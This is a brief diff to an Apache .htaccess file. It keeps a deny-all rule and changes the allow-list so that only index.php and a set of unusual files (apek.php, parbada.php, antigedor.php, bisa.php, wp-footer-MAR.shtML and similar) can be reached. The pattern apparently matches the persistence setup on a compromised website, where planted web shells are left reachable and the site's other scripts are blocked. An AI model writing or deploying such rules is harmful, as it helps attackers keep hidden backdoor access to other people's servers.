@@ -3,7 +3,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|super.php|tobrut.php)$">
+<FilesMatch "^(index.php|apek.php|wp-footer-MAR.shtML|bisa.php|parbadanew.php|parbada.php|antigedor.php|antigedornew.php|parbada-alfa.php|parbada-ceki.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
